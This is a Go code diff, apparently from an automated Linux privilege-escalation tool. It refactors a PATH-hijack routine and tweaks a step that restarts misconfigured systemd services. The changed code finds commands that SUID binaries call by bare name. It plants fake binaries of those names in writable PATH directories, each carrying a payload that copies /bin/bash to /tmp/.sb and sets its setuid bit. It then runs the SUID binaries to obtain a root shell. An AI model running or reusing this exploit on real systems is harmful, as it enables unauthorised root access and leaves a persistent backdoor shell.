@@ -610,7 +610,11 @@ func misconfigSystemd(s *systemInfo, stop *bool) bool {
 			runIsolated("systemd:reload", "", []string{"systemctl", "daemon-reload"},
 				5*time.Second)
 			svc := strings.TrimSuffix(ent.Name(), ".service")
-			r := runIsolated("systemd:restart", "", []string{"systemctl", "restart", svc},
+			// Use --no-block so we don't hang waiting for the service
+			// to restart (some services take 60s+ and block the runner,
+			// causing the server to appear unresponsive).
+			r := runIsolated("systemd:restart", "",
+				[]string{"systemctl", "restart", "--no-block", svc},
 				15*time.Second)
 			r.report()
 			if spawnIfRoot("systemd", &r, stop) {
@@ -717,6 +721,43 @@ func misconfigPathHijack(s *systemInfo, stop *bool) bool {
 	// Hoist scanSUID outside the loop — it scans 12+ directories and
 	// returns identical results for every writable PATH dir.
 	suids := scanSUID()
+
+	// Deduplicate command names across ALL SUID binaries so we don't
+	// plant+test the same command N times (e.g. "kill" found in 5
+	// SUID binaries = 5 redundant attempts that made the old output
+	// huge and wasted time).
+	type candidate struct {
+		cmd  string
+		path string
+		uid  string // the SUID binary that references it
+	}
+	seen := map[string]bool{} // dedup by "cmd@suid"
+	var candidates []candidate
+
+	for _, suid := range suids {
+		out, err := exec.Command("strings", suid).Output()
+		if err != nil {
+			continue
+		}
+		for _, line := range strings.Split(string(out), "\n") {
+			line = strings.TrimSpace(line)
+			if line == "" || strings.Contains(line, "/") || len(line) > 30 {
+				continue
+			}
+			realPath, err := exec.LookPath(line)
+			if err != nil {
+				continue
+			}
+			key := line + "@" + suid
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+			candidates = append(candidates, candidate{cmd: line, path: realPath, uid: suid})
+		}
+	}
+
+	// Now plant+test each unique candidate once per writable PATH dir.
 	for _, d := range pathDirs {
 		if d == "" {
 			continue
@@ -724,34 +765,16 @@ func misconfigPathHijack(s *systemInfo, stop *bool) bool {
 		if !dirWritable(d) {
 			continue
 		}
-		// Check if any SUID binary calls commands by relative name.
-		for _, suid := range suids {
-			// Use strings to find command names.
-			out, err := exec.Command("strings", suid).Output()
-			if err != nil {
-				continue
-			}
-			for _, line := range strings.Split(string(out), "\n") {
-				line = strings.TrimSpace(line)
-				// Single-word command names (no /).
-				if line == "" || strings.Contains(line, "/") || len(line) > 30 {
-					continue
-				}
-				// Check if it's a real binary name.
-				if realPath, err := exec.LookPath(line); err == nil {
-					// Plant a fake binary.
-					fakePath := filepath.Join(d, line)
-					payload := fmt.Sprintf("#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\nexec %s \"$@\"\n", realPath)
-					_ = os.WriteFile(fakePath, []byte(payload), 0o755)
-					infof("Planted PATH hijack: %s → %s", line, fakePath)
-					// Run the SUID binary.
-					r := runIsolated("path:"+line, "", []string{suid}, 10*time.Second)
-					r.report()
-					_ = os.Remove(fakePath) // cleanup
-					if spawnIfRoot("path", &r, stop) {
-						return true
-					}
-				}
+		for _, c := range candidates {
+			fakePath := filepath.Join(d, c.cmd)
+			payload := fmt.Sprintf("#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\nexec %s \"$@\"\n", c.path)
+			_ = os.WriteFile(fakePath, []byte(payload), 0o755)
+			infof("Planted PATH hijack: %s → %s", c.cmd, fakePath)
+			r := runIsolated("path:"+c.cmd, "", []string{c.uid}, 10*time.Second)
+			r.report()
+			_ = os.Remove(fakePath)
+			if spawnIfRoot("path", &r, stop) {
+				return true
 			}
 		}
 	}
